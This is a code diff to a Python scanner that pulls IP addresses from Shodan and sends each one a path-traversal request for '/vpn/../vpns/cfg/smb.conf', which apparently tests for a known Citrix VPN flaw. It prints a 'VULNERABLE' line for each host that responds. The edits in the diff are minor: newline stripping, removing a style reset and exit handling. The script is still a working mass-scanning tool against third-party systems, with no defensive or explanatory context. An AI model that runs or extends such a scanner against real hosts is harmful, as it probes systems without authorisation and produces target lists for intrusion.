@@ -1,4 +1,4 @@
-import requests
+import requests, sys
 from shodan import Shodan
 from colorama import Fore, Style
 
@@ -10,11 +10,10 @@ def verify(ip):
     try:
         r = requests.get('https://{}/vpn/../vpns/cfg/smb.conf'.format(ip), verify=False, timeout=0.5)
         if r.status_code == 200:
+            ip = ip.replace('\n', '')
             print(Fore.GREEN+"[+] VULNERABLE -> {}".format(ip))
         else:
             pass
-        print(Style.RESET_ALL)
-
     except:
         pass
 def getIp():
@@ -26,4 +25,8 @@ def getIp():
                 verify(i)
     except:
         pass
-getIp()
+
+try:
+    getIp()
+except KeyboardInterrupt:
+    sys.exit()
